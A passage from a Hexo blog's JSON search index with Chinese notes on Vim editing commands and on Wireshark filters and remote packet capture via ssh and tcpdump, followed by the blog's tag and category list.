移动至下一个冲突(文件尾部方向)]c&quot; 移动至上一个冲突(文件首部方向)[c 冲突合并 1234567&quot; 另一个文件 ---&gt; 当前文件&quot; 意为`obtain`do&quot; 当前文件 ---&gt; 另一个文件&quot; 意为`put`dp diff窗口管理 与普通窗口管理相同 补全 退出补全 12&quot; 退出补全菜单，恢复当次已补全内容C-e 确定补全 12&quot; 选中补全菜单中当前条目,并接受C-y 排版 居中 1234&quot; 居中当前文本行:center&quot; 简写 :ce:ce 居左 1234&quot; 居左当前文本行:left&quot; 简写 :le:le 居右 1234&quot; 居右当前文本行:right&quot; 简写 :ri:ri 重排 1234&quot;对选中的文字重排,即对过长的文本行断行gq&quot;重排当前行gqq 编辑二进制 编辑二进制文件 12# 以-b模式启动，可以将文件认为是二进制的方式进行编辑打开vim -b filename 将当前缓冲区内容转为十六进制 比较大的问题是，由于是死板的转换，文末的换行符也会被转换为0a。 12&quot; 借助于vim的外部工具xxd将内容转为十六进制:%!xxd 编辑好的十六进制内容转换为正常文本 1:%!xxd -r 外部命令 调用外部命令 普通调用外部命令 1:! ls 调用外部命令,输出追加到buffer 12&quot; help read:r ! ls 调用外部命令处理缓冲区内容 buffer内容作为命令的stdin,处理结果输出回buffer 1:% ! sort buffer 光标行居顶 可见区下移 1zt 光标行居中 1zz 光标行居底 可见区上移 1zb 光标列居左 可见区右移 1zL 光标列居右 可见区左移 1zH 选项 modeline 在文件首/尾写入vim局部配置, 以注释方式如 1# vim: set tabstop=2 shiftwidth=2 textwidth=120 expandtab : scrolloff 设置vim渲染时，buffer顶部/底部预留行数","link":"/something-about-vim/"},{"title":"something about wireshark","text":"something about wiresharkwireshark wireshark 维基百科 wireshark 官网 Capture过滤表达式只抓取表达式 匹配成功 的包，对于不匹配的包不予抓取。 表达式为与 TCP dump 相同的表达式。 查看手册 packet filter syntax 1man pcap-filter 只关注80端口 1tcp port 80 只关注icmp协议 1icmp Display过滤表达式对 已经抓取 的包，进行 过滤显示 ，只显示表达式 匹配成功 的包，对于不匹配的包不予显示。 与 Capture过滤表达式 不同, Display过滤表达式是wireshark package列表过滤表达式, 语法 不相同。 Display过滤表达式 语法更多 。 相关文档 Display Filter Expression display filter 输入框处右击，选择 Display Filter Expression ,进入表达式编辑窗口,用于创建 复杂表达式 。 网络协议 Internet Protocol Version 4 IPv4协议 Transmission Control Protocol TCP协议(传输控制协议) Hypertext Transfer Protocol 超文本传输协议 数据包详情 MAC地址 在 以太网数据包 中 Package Bytes 中十六进制内容为 0800 时，一般为标识 IPv4协议 。 专家模式 Expert Information 专家模式 专家模式下，会将 对话 、错误信息、重复应答、警告等在列表中显示。更加方便查看。 远程抓包 SSH remote capture 需要远程机器安装wireshark(桌面版/命令行版 tshark 都可), 远程执行二进制程序一般为dumpcap(由wireshark提供)。 配置ssh相关内容,配置 远程网卡 等信息，配置远程二进制程序等。 配置完成后，即可由本机wireshark通过ssh与远程wireshark二进制程序联动，实际工作由远程wireshark二进制程序负责。 本地wireshark负责内容输出。 Tcpdump 远程抓包 需要远程机器安装tcpdump作为远程执行二进制程序。 tcpdump 使用 tcpdump 常用参数 -D 列出本机可用网卡 -i wlan0 指定使用wlan0网卡 -c 20 指定抓取20个包 -w filename 指定输出到文件 -w - 指定标准输出 ‘filter expressions’ 最后附加filter参数 -l 指定逐行输出，不加缓存 搭配ssh与本地wireshark使用: 12# 将远程tcpdump的标准输出作为wireshark的标准输入ssh root@123.124.125.126 &quot;tcpdump -i wlan0 -c 20 -w - 'not port 22'&quot; | wireshark -i - 本地wireshark与远程tcpdump联动，实时抓包(不指定-c参数) 1234# -k 参数指定本地wireshark实时抓包ssh root@123.124.125.126 &quot;tcpdump -i wlan0 -w - 'not port 22'&quot; | wireshark -k -i -# -l 参数指定远程tcpdump逐行输出，而非缓存到一定程度后分批输出ssh root@123.124.125.126 &quot;tcpdump -l -i wlan0 -w - 'not port 22'&quot; | wireshark -k -i - tshark 远程抓包 与tcpdump类似的命令行。 tshark 常用参数 -D 列出本机可用网卡 -i eth0 指定使用eth0网卡 命令最后可以增加filter expressions","link":"/something-about-wireshark/"}],"tags":[{"name":"virtualbox","slug":"virtualbox","link":"/tags/virtualbox/"},{"name":"burpsuite","slug":"burpsuite","link":"/tags/burpsuite/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"HTB","slug":"HTB","link":"/tags/HTB/"},{"name":"ldap","slug":"ldap","link":"/tags/ldap/"},{"name":"active direcotry","slug":"active-direcotry","link":"/tags/active-direcotry/"},{"name":"kms","slug":"kms","link":"/tags/kms/"},{"name":"office","slug":"office","link":"/tags/office/"},{"name":"openwrt","slug":"openwrt","link":"/tags/openwrt/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"reversing-enging","slug":"reversing-enging","link":"/tags/reversing-enging/"},{"name":"buffer overflow","slug":"buffer-overflow","link":"/tags/buffer-overflow/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"dvwa","slug":"dvwa","link":"/tags/dvwa/"},{"name":"file inclusion","slug":"file-inclusion","link":"/tags/file-inclusion/"},{"name":"file upload","slug":"file-upload","link":"/tags/file-upload/"},{"name":"sql injection","slug":"sql-injection","link":"/tags/sql-injection/"},{"name":"weak session id","slug":"weak-session-id","link":"/tags/weak-session-id/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"brute force","slug":"brute-force","link":"/tags/brute-force/"},{"name":"command injection","slug":"command-injection","link":"/tags/command-injection/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"Medusa","slug":"Medusa","link":"/tags/Medusa/"},{"name":"Netcat","slug":"Netcat","link":"/tags/Netcat/"},{"name":"pikachu","slug":"pikachu","link":"/tags/pikachu/"},{"name":"over permission","slug":"over-permission","link":"/tags/over-permission/"},{"name":"php serialize","slug":"php-serialize","link":"/tags/php-serialize/"},{"name":"SSRF","slug":"SSRF","link":"/tags/SSRF/"},{"name":"file download","slug":"file-download","link":"/tags/file-download/"},{"name":"XXE","slug":"XXE","link":"/tags/XXE/"},{"name":"infoleak","slug":"infoleak","link":"/tags/infoleak/"},{"name":"目录遍历","slug":"目录遍历","link":"/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"测试阶段","slug":"测试阶段","link":"/tags/%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5/"},{"name":"google","slug":"google","link":"/tags/google/"},{"name":"baidu","slug":"baidu","link":"/tags/baidu/"},{"name":"github","slug":"github","link":"/tags/github/"},{"name":"search skills","slug":"search-skills","link":"/tags/search-skills/"},{"name":"sqli-labs","slug":"sqli-labs","link":"/tags/sqli-labs/"},{"name":"sqlmap","slug":"sqlmap","link":"/tags/sqlmap/"},{"name":"tmux","slug":"tmux","link":"/tags/tmux/"},{"name":"vim","slug":"vim","link":"/tags/vim/"},{"name":"wireshark","slug":"wireshark","link":"/tags/wireshark/"}],"categories":[{"name":"developTool","slug":"developTool","link":"/categories/developTool/"},{"name":"tool","slug":"tool","link":"/categories/tool/"},{"name":"penetration Test","slug":"penetration-Test","link":"/categories/penetration-Test/"},{"name":"train","slug":"penetration-Test/train","link":"/categories/penetration-Test/train/"},{"name":"openwrt","slug":"openwrt","link":"/categories/openwrt/"},{"name":"tool","slug":"penetration-Test/tool","link":"/categories/penetration-Test/tool/"},{"name":"skills","slug":"skills","link":"/categories/skills/"},{"name":"hexo","slug":"hexo","link":"/categories/hexo/"},{"name":"vim","slug":"vim","link":"/categories/vim/"}]}